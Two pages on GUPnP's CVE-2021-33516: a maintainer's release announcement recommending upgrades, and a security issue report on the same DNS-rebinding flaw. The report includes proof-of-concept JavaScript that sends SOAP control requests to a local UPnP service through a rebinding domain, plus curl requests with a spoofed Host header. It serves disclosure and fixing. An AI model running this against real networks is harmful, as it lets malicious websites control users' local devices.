=== Content from discourse.gnome.org_d0011be1_20250114_192141.html ===


![GNOME Discourse](data:image/svg;base64...)
Loading

[GNOME Discourse](/)

# [Security-relevant releases for GUPnP issue CVE-2021-33516](/t/security-relevant-releases-for-gupnp-issue-cve-2021-33516/6536)

[Platform](/c/platform/5)

[distributor](https://discourse.gnome.org/tag/distributor),
[gupnp](https://discourse.gnome.org/tag/gupnp)

[jensgeorg](https://discourse.gnome.org/u/jensgeorg)
(Jens Georg)

May 24, 2021, 9:43am

1

Hello,

I just released GUPnP 1.0.7 and GUPnP 1.2.5 which contain an important fix for a potential DNS rebind attack.

A malicious website could trick UPnP services implemented with GUPnP to react to requests coming from that website, leading to e.g. data exfiltration or unwanted or harmful remote calls from said website

Upgrading is strongly recommended.

The relevant commits are

[service: Validate host header (ca6ec9dc) · Commits · GNOME / gupnp · GitLab](https://gitlab.gnome.org/GNOME/gupnp/-/commit/ca6ec9dcb26fd7a2a630eb6a68118659b589afac) and [service: Validate host header (05e964d4) · Commits · GNOME / gupnp · GitLab](https://gitlab.gnome.org/GNOME/gupnp/-/commit/05e964d48322ff23a65c6026d656e4494ace6ff9).

Note: This fix might cause compatibility issues with older broken UPnP clients. CVE id for this is currently pending assignment.

Mitigation: Using a DNS resolver that prevents DNS rebinding

[jensgeorg](https://discourse.gnome.org/u/jensgeorg)
(Jens Georg)

May 24, 2021, 2:25pm

2

I accidentally made GUPnP depend on the unreleased 1.2.4 version of GSSDP. This is not necessary, it works fine with 1.2.3.

[jensgeorg](https://discourse.gnome.org/u/jensgeorg)
(Jens Georg)

May 24, 2021, 2:43pm

3

I rolled a 1.2.6 with lowered dependencies, sorry again.

[system](https://discourse.gnome.org/u/system)
(system)
Closed

June 7, 2021, 2:43pm

4

This topic was automatically closed 14 days after the last reply. New replies are no longer allowed.

* [Home](/)
* [Categories](/categories)
* [Guidelines](/guidelines)
* [Terms of Service](/tos)
* [Privacy Policy](https://www.gnome.org/privacy/)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



=== Content from gitlab.gnome.org_8f794a3b_20250114_192142.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

# Security Issue: Server does not check value of Host header

## Message

## Summary

The server-part of GUPNP appears to be vulnerable to DNS-rebinding attacks because it does not check the value of the `Host` header.

We demonstrate this using `gupnp-network-light`.

This code served from another web server can be used to trigger the `SetLoadLevelTarget`.

This need to be served using the same port as the targeted `gupnp-network-light` service.

```
function sleep(delay)
{
  return new Promise((resolve, reject) => {
    setTimeout(resolve, delay);
  });
}
async function main()
{
  while(true) {
    const response = await fetch("/Dimming/Control", {
      method: "POST",
      headers: {
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": '"urn:schemas-upnp-org:service:Dimming:1#SetLoadLevelTarget"',
      },
      body: `

        100

  `
    });
    if (response.status == 200) {
      alert("DONE!")
      return;
    }
    await sleep(1000);
  }
}
main()
```

We use access the malicious web server using a URL of the form:

```
http://a.203.0.113.24.5time.192.168.1.42.forever.3643bba7-1363-43c6-9865-2db92aaeccb3.rebind.network:38757/
```

where:

* `203.0.113.24.5` is the IP address of the malicious server;
* `192.168.1.42` is the private IP address of the `gupnp-network-light` service.

However we need to guess the local IP address and port of the service.
We can use [WebSocket based port scanning](https://incolumitas.com/2021/01/10/browser-based-port-scanning/)
in order to do this.

This was tested on:

* Debian testing;
* gupnp-tools 0.10.0-2;
* libgupnp 1.2.4-1.

## Code

The following verifications are done by `control_server_handler()`:

```
if (msg->method != SOUP_METHOD_POST) {
        soup_message_set_status (msg, SOUP_STATUS_NOT_IMPLEMENTED);

        return;
}

if (msg->request_body->length == 0) {
        soup_message_set_status (msg, SOUP_STATUS_BAD_REQUEST);

        return;
}

/* DLNA 7.2.5.6: Always use HTTP 1.1 */
if (soup_message_get_http_version (msg) == SOUP_HTTP_1_0) {
        soup_message_set_http_version (msg, SOUP_HTTP_1_1);
        soup_message_headers_append (msg->response_headers,
                                      "Connection",
                                      "close");
}

context = gupnp_service_info_get_context (GUPNP_SERVICE_INFO (service));

/* Get action name */
soap_action = soup_message_headers_get_one (msg->request_headers,
                                            "SOAPAction");
if (!soap_action) {
        soup_message_set_status (msg, SOUP_STATUS_PRECONDITION_FAILED);
        return;
}

action_name = strchr (soap_action, '#');
if (!action_name) {
        soup_message_set_status (msg, SOUP_STATUS_PRECONDITION_FAILED);

        return;
}
```

## Details

Here's a normal UPnP request:

```
curl -D- http://192.168.1.42:38757/Dimming/Control \
    -H"Content-Type: text/xml; charset=utf-8" \
    -H'SOAPAction: "urn:schemas-upnp-org:service:Dimming:1#SetLoadLevelTarget"' \
    --data-raw '

        100

'
```

```
HTTP/1.1 200 OK
Date: Tue, 06 Apr 2021 20:05:58 GMT
Content-Type: text/xml; charset="utf-8"
Ext:
Server: Linux/5.10.0-5-amd64 UPnP/1.0 GUPnP/1.2.4
Content-Length: 285
```

The server does not check the `Content-Type` header:

```
curl -D- http://192.168.1.42:38757/Dimming/Control \
    -H"Content-Type: text/xml; charset=utf-8" \
    -H'SOAPAction: "urn:schemas-upnp-org:service:Dimming:1#SetLoadLevelTarget"' \
    --data-raw '

        100

'
```

```
HTTP/1.1 200 OK
Date: Tue, 06 Apr 2021 20:06:28 GMT
Content-Type: text/xml; charset="utf-8"
Ext:
Server: Linux/5.10.0-5-amd64 UPnP/1.0 GUPnP/1.2.4
Content-Length: 285
```

However, it mandates the usage `SOAPAction` header which prevents any CSRF attack:

```
curl -D- http://192.168.1.42:38757/Dimming/Control \
    -H"Content-Type: text/xml; charset=utf-8" \
    --data-raw '

        100

'
```

```
HTTP/1.1 412 Precondition Failed
Date: Tue, 06 Apr 2021 20:25:57 GMT
Content-Length: 0
```

It does not check the host header:

```
curl -D- http://192.168.1.42:38757/Dimming/Control \
    -H"Host: www.example.com" \
    -H"Content-Type: text/xml; charset=utf-8" \
    -H'SOAPAction: "urn:schemas-upnp-org:service:Dimming:1#SetLoadLevelTarget"' \
    --data-raw '

        100

'
```

```
HTTP/1.1 200 OK
Date: Tue, 06 Apr 2021 20:08:13 GMT
Content-Type: text/xml; charset="utf-8"
Ext:
Server: Linux/5.10.0-5-amd64 UPnP/1.0 GUPnP/1.2.4
Content-Length: 285
```

Edited Apr 07, 2021 by [Andre Klapper](/aklapper)

Assignee
Loading

Time tracking
Loading


